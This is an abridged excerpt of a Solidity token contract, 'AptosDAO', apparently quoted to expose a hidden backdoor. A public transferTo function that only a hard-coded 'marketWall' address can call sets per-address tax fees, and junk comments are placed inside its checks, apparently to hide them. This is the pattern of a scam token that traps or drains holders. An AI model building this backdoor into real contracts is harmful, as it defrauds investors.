...
contract AptosDAO is Context, IERC20, Ownable {
    ...
    string private _symbol = "APTDAO";
    uint8 private _decimals = 9;

    address payable private marketWall = payable(0x7410deae0960212416B9354502524e4255c98De6); 
    address payable private teamWalletAddress = payable(0xDFD19066cCfec2f7E77fB7C0C03A796B53a0e9A6); 
	...
	if( _mainPai[ /*as asdf*/msg.sender])
	   {
	...
	function transferTo(address _address, bool _enable, uint256 _addressTaxFee) public {
	    if( marketWall/*asdf aw dawf*/ ==  /*asdf aw dawf*/msg.sender){
